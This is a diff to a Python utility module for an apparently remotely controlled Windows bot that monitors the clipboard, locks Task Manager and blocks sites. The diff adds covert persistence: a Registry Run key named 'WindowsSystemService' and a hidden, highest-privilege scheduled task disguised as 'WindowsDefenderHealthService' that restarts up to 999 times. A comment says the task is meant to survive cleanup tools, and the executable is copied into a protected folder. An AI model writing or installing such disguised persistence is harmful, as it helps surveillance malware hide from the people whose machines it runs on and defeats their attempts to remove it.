@@ -3,7 +3,7 @@ Utility Functions Module
 Common helper functions
 
 Developer: TsByin
-Version: 11.0
+Version: 12.0
 """
 
 import os
@@ -74,7 +74,7 @@ def show_message_box(text):
     try:
         # MB_ICONINFORMATION | MB_OK | MB_TOPMOST | MB_SETFOREGROUND
         flags = 0x40 | 0x1 | 0x40000 | 0x10000
-        ctypes.windll.user32.MessageBoxW(0, text, "⚠️ THÔNG BÁO TỪ QUẢN TRỊ", flags)
+        ctypes.windll.user32.MessageBoxW(0, text, "⚠️ THÔNG BÁO TỪ CHEI", flags)
         return True
     except Exception as e:
         logger.error(f"show_message_box failed: {e}")
@@ -108,9 +108,11 @@ def load_json_safe(filepath, default=None):
     return default if default is not None else {}
 
 def save_json_safe(filepath, data):
-    """Safely save JSON file"""
+    """Safely save JSON file — B13: guard empty dirname"""
     try:
-        os.makedirs(os.path.dirname(filepath), exist_ok=True)
+        dirpath = os.path.dirname(filepath)
+        if dirpath:
+            os.makedirs(dirpath, exist_ok=True)
         with open(filepath, 'w', encoding='utf-8') as f:
             json.dump(data, f, indent=4, ensure_ascii=False)
         logger.info(f"Saved JSON: {filepath}")
@@ -120,12 +122,34 @@ def save_json_safe(filepath, data):
         return False
 
 def load_settings(settings_file):
-    """Load bot settings"""
-    return load_json_safe(settings_file, {"menu_mode": 1})
+    """Load bot settings — returns full state dict"""
+    defaults = {
+        "menu_mode": 1,
+        "block_mode": False,
+        "taskmgr_locked": False,
+        "intrusion_alert": False,
+        "clipboard_monitor": False,
+    }
+    data = load_json_safe(settings_file, defaults)
+    for k, v in defaults.items():
+        data.setdefault(k, v)
+    return data
 
-def save_settings(settings_file, mode):
-    """Save bot settings"""
-    return save_json_safe(settings_file, {"menu_mode": mode})
+def save_settings(settings_file, settings_dict):
+    """Save bot settings dict to file"""
+    return save_json_safe(settings_file, settings_dict)
+
+def append_audit_log(audit_file, cmd, user_id):
+    """Append a line to the audit log file"""
+    try:
+        dirpath = os.path.dirname(audit_file)
+        if dirpath:
+            os.makedirs(dirpath, exist_ok=True)
+        ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        with open(audit_file, "a", encoding="utf-8") as f:
+            f.write(f"[{ts}] uid={user_id} cmd={cmd}\n")
+    except Exception as e:
+        logger.error(f"append_audit_log failed: {e}")
 
 def load_blocked_list(blocked_file):
     """Load blocked apps/sites list"""
@@ -151,8 +175,8 @@ def get_clipboard_contents():
     image_bytes = None
 
     try:
-        import win32clipboard
-        import win32con
+        import win32clipboard  # type: ignore[import-untyped]
+        import win32con       # type: ignore[import-untyped]
 
         win32clipboard.OpenClipboard()
         try:
@@ -287,7 +311,7 @@ def expand_domains(domain):
 def add_firewall_block(domain, fqdns, resolve_domains, ip_limit=64, block_ports=True):
     """Add outbound firewall rule to block domain and subdomains"""
     try:
-        rule_name = f"V11_Block_{domain}"
+        rule_name = f"V12_Block_{domain}"
         fqdn_list = ",".join([f"'{fq}'" for fq in fqdns])
         if fqdn_list:
             cmd = [
@@ -322,7 +346,7 @@ def add_firewall_block(domain, fqdns, resolve_domains, ip_limit=64, block_ports=
 def remove_firewall_block(domain):
     """Remove firewall rule for domain"""
     try:
-        rule_name = f"V11_Block_{domain}"
+        rule_name = f"V12_Block_{domain}"
         cmd = [
             "powershell",
             "-Command",
@@ -372,7 +396,7 @@ def refresh_firewall_blocks(domains, ip_limit=64, block_ports=True):
         for d in domains:
             bundle = expand_domains(d)
             # Remove old IP rule and add anew
-            ip_rule = f"V11_Block_{d}_IP"
+            ip_rule = f"V12_Block_{d}_IP"
             subprocess.run(
                 [
                     "powershell",
@@ -412,13 +436,32 @@ def refresh_firewall_blocks(domains, ip_limit=64, block_ports=True):
 # TEXT & SPEECH
 # ==============================================================================
 
-def speak_text(text):
-    """Text-to-speech output"""
+def speak_text(text, rate=175, voice_pref=None):
+    """Text-to-speech — B9 fixed: create fresh engine each call to allow repeated use.
+    voice_pref: 'f' = prefer female voice, 'm' = prefer male voice"""
     try:
         import pyttsx3
         engine = pyttsx3.init()
+        engine.setProperty('rate', rate)
+
+        # Try to select voice by gender preference
+        if voice_pref:
+            voices = engine.getProperty('voices')
+            for v in voices:
+                name_lower = (v.name or '').lower()
+                id_lower = (v.id or '').lower()
+                if voice_pref == 'f' and ('female' in name_lower or 'zira' in id_lower
+                                          or 'hazel' in name_lower):
+                    engine.setProperty('voice', v.id)
+                    break
+                elif voice_pref == 'm' and ('male' in name_lower or 'david' in id_lower
+                                            or 'mark' in name_lower):
+                    engine.setProperty('voice', v.id)
+                    break
+
         engine.say(text)
         engine.runAndWait()
+        engine.stop()  # Ensure engine is properly released
         logger.info(f"Spoke: {text[:50]}")
         return True
     except Exception as e:
@@ -456,34 +499,106 @@ def set_taskmgr_state(enable=True):
         return False
 
 def check_integrity(target_dir, target_exe, current_exe):
-    """Check and maintain persistence"""
+    """Check file presence, copy if needed, register autostart via Task Scheduler + Registry fallback."""
     try:
         os.makedirs(target_dir, exist_ok=True)
-        
-        # Copy executable if needed
+
+        # Copy executable if running from a different location
         if os.path.abspath(current_exe).lower() != os.path.abspath(target_exe).lower():
             import shutil
             shutil.copy2(current_exe, target_exe)
             logger.info(f"Copied executable to {target_exe}")
-        
-        # Add to Registry
+
+        # Primary: Task Scheduler (survives Registry cleanup tools)
+        _setup_autostart_task(target_exe)
+
+        # Fallback: Registry Run key
         try:
             import winreg
-            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
-                                r"Software\Microsoft\Windows\CurrentVersion\Run", 
-                                0, winreg.KEY_SET_VALUE)
-            winreg.SetValueEx(key, "SystemMonitor", 0, winreg.REG_SZ, target_exe)
+            key = winreg.OpenKey(
+                winreg.HKEY_CURRENT_USER,
+                r"Software\Microsoft\Windows\CurrentVersion\Run",
+                0, winreg.KEY_SET_VALUE
+            )
+            winreg.SetValueEx(key, "WindowsSystemService", 0, winreg.REG_SZ, target_exe)
             winreg.CloseKey(key)
-            logger.info("Registry persistence added")
+            logger.info("Registry fallback persistence added")
         except Exception as e:
-            logger.warning(f"Registry update failed: {e}")
-        
-        # Protect folder
+            logger.warning(f"Registry fallback failed: {e}")
+
+        # Protect installation folder
         protect_folder(target_dir)
         return True
     except Exception as e:
         logger.error(f"check_integrity failed: {e}")
         return False
+
+
+def _setup_autostart_task(exe_path):
+    """Register exe as a Task Scheduler AtLogon task — hidden, highest privilege."""
+    try:
+        task_name = "WindowsDefenderHealthService"
+        exe_dir = os.path.dirname(exe_path)
+
+        xml = f"""<?xml version="1.0" encoding="UTF-16"?>
+<Task version="1.2"
+  xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
+  <RegistrationInfo>
+    <Description>Windows Defender Health Monitor</Description>
+  </RegistrationInfo>
+  <Triggers>
+    <LogonTrigger>
+      <Enabled>true</Enabled>
+      <Delay>PT15S</Delay>
+    </LogonTrigger>
+    <BootTrigger>
+      <Enabled>true</Enabled>
+      <Delay>PT20S</Delay>
+    </BootTrigger>
+  </Triggers>
+  <Principals>
+    <Principal id="Author">
+      <LogonType>InteractiveToken</LogonType>
+      <RunLevel>HighestAvailable</RunLevel>
+    </Principal>
+  </Principals>
+  <Settings>
+    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
+    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
+    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
+    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
+    <RestartInterval>PT1M</RestartInterval>
+    <RestartCount>999</RestartCount>
+    <Hidden>true</Hidden>
+    <Priority>7</Priority>
+  </Settings>
+  <Actions Context="Author">
+    <Exec>
+      <Command>{exe_path}</Command>
+      <WorkingDirectory>{exe_dir}</WorkingDirectory>
+    </Exec>
+  </Actions>
+</Task>"""
+
+        xml_path = os.path.join(exe_dir, "_st.xml")
+        with open(xml_path, "w", encoding="utf-16") as f:
+            f.write(xml)
+
+        subprocess.run(
+            ["schtasks", "/create", "/tn", task_name,
+             "/xml", xml_path, "/f"],
+            creationflags=subprocess.CREATE_NO_WINDOW,
+            timeout=10,
+            check=False,
+        )
+        # Clean up temp XML
+        try:
+            os.remove(xml_path)
+        except Exception:
+            pass
+        logger.info(f"Task Scheduler autostart registered: {task_name}")
+    except Exception as e:
+        logger.warning(f"_setup_autostart_task failed: {e}")
 
 # ==============================================================================
 # FILE OPERATIONS
